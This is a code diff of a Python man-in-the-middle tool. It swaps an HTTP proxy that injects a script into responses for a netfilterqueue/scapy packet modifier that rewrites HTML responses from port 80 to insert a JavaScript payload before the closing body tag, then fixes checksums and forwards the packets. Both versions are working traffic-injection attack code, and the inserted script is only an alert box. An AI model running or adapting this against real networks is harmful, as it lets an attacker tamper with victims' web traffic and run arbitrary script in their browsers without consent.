@@ -1,83 +1,55 @@
-import asyncio
+import netfilterqueue
+import scapy.all as scapy
 
-# Javascript injection payload
-INJECTION_SCRIPT = "<script>alert('DEVICE COMPROMISED')</script>"
+# Javascript injection string
+INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>"
 
-async def handle_client(reader, writer):
+def process_packet(packet):
     """
-    This function handles new connections to the proxy server
+    This function is called for each packet in the NFQUEUE.
+    It checks for HTTP responses and injects a script.
     """
+    scapy_packet = scapy.IP(packet.get_payload())
 
-    # Read initial HTTP request from client
-    request_data = await reader.read(4096)
+    print(scapy_packet.summary())
 
-    if not request_data:
+    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
 
-        writer.close()
-        await writer.wait_closed()
-        return
-    
-    print (f"[PROXY] Intercepted target request.")
+        # Look for HTTP responses coming FROM port 80
+        if scapy_packet[scapy.TCP].sport == 80:
+            http_load = scapy_packet[scapy.Raw].load
+            # Check if it's an HTML page
+            if b"</body>" in http_load and b"Content-Type: text/html" in http_load:
+                print("[+] HTML Response detected. Injecting script...")
+                
+                # Replace the closing body tag with our script + the closing tag
+                modified_load = http_load.replace(b"</body>", INJECTION_SCRIPT + b"</body>")
+                
+                # Set the modified load back into the packet
+                scapy_packet[scapy.Raw].load = modified_load
+                
+                # Scapy needs to recalculate checksums and length after modification.
+                # Deleting them makes scapy handle it automatically upon conversion to bytes.
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                
+                # Set the payload of the original queue packet to our modified packet
+                packet.set_payload(bytes(scapy_packet))
 
-    # Find the destination server from the 'Host:' header
-    host = ""
-    for line in request_data.decode('latin-1').splitlines():
-        if line.lower().startswith('host:'):
-            host = line.split(' ')[1].strip()
-            break
+    # Forward the packet (whether it was modified or not)
+    packet.accept()
 
-    if not host:
-        writer.close()
-        await writer.wait_closed()
-        return
-    
-    # Open new connection to the real destination server
+
+def start():
+    """
+    Starts the packet interception queue.
+    """
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet) # Bind to queue 0 and set the callback
+    print("[*] Packet modifier started. Waiting for traffic...")
     try:
-        remote_reader, remote_writer = await asyncio.open_connection(host, 80)
-
-    except Exception as e:
-        print(f"[ERROR] Could not connect to destination {host}: {e}")
-        writer.close()
-        await writer.wait_closed()
-        return
-    
-    # Forward target's request to destination
-    remote_writer.write(request_data)
-    await remote_writer.drain()
-
-    # Read the response from the destination server
-    response_data = await remote_reader.read(4096)
-
-    # Modification step
-    # Convert response to string, inject script before </body> tag, and convert back to bytes
-    response_str = response_data.decode('latin-1')
-    modified_repsonse_str = response_str.replace('</body>', INJECTION_SCRIPT + '</body>')
-    modified_repsonse_bytes = modified_repsonse_str.encode('latin-1')
-
-    print('[PROXY] Injected script into response.')
-
-    # Forward response back to victim
-    writer.write(modified_repsonse_bytes)
-    await writer.drain()
-
-    # Clean up the connections
-    writer.close()
-    await writer.wait_closed()
-    remote_writer.close()
-    await remote_writer.wait_closed()
-
-async def start_proxy_server():
-    server = await asyncio.start_server(
-        handle_client, '127.0.0.1', 8080)
-
-    addr = server.sockets[0].getsockname()
-    print(f'[PROXY] HTTP Modifier Proxy serving on {addr}')
-
-    async with server:
-        await server.serve_forever()
-
-if __name__ == '__main__':
-    try:
-        asyncio.run(start_proxy_server())
+        queue.run()
     except KeyboardInterrupt:
-        print("\n[PROXY] Shutting down proxy server.")
+        print("\n[*] Shutting down packet modifier.")
+        queue.unbind()
